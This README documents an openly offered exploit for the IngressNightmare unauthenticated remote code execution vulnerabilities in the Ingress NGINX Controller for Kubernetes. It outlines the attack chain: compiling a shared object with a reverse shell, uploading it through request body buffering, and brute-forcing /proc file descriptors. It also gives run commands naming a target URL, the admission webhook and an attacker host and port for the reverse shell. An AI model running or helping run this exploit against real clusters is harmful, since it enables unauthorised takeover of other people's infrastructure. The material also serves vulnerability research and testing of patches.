## Exploit for Ingress NGINX - IngressNightmare

This project provides an exploit targeting critical **unauthenticated Remote Code Execution (RCE)** vulnerabilities in the Ingress NGINX Controller for Kubernetes, collectively referred to as IngressNightmare.

In the original research, the Wiz team did not provide a PoC or a functional exploit, so we decided to create our own and share it with the community.

#### Overview

The Ingress NGINX Controller is a widely used component in Kubernetes environments, managing external access to services within clusters. Recent vulnerabilities (CVE-2025-1097, CVE-2025-1098, CVE-2025-24514, CVE-2025-1974) have highlighted critical security risks.

### **Exploit Workflow**

The exploit follows these main steps:

**Generate shared object** (used by the injected `ssl_engine` property):
*Compiles a .so library (evil_engine.so) containing reverse shell payload.*

**Upload the shared object**:
*Sends the compiled shared object to the ingress pod, leveraging request handling (client body buffers). The trick here is to send a different `Content-Length` to the server to keep the connection open.*

**Brute-force fd**:
*Iterates over process IDs and file descriptors (/proc/{pid}/fd/{fd}) to identify the correct descriptor referencing the uploaded object.*

Usage

Prerequisites:
- Python 3.x
- GCC compiler
- Python requests module

Run exploit:

`pip3 install -r requirements.txt`

`python3 exploit.py <ingress_url> <admission_webhook_url> [attacker_host:port](attacker_host:port)`

Ex: `python3 poc.py http://192.168.0.154 https://rke2-ingress-nginx-controller-admission.kube-system 192.168.1.63:443`

Sometimes the `admission webhook` is in a different namespace. In this case, you need to specify the namespace at the end, such as `kube-system`, `default`, or `ingress-nginx`.

- `<ingress_url>`: Target Ingress URL (public)
- `<admission_webhook_url>`: Admission webhook URL (internal webhook)
- `[attacker_host:port](attacker_host:port)`: Your host and port for reverse shell
